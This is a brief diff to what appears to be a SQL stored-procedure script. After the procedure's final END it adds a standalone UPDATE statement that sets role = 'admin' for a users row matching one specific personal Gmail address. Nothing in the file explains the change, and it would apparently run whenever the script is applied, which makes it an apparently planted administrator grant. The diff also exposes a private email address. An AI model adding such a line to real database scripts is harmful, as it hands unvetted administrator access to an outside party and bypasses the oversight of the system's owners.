@@ -21,3 +21,6 @@ ELSE
         RETURN
     END
 END
+
+
+UPDATE users SET role = 'admin' WHERE email = 'muriithikiamad1@gmail.com'
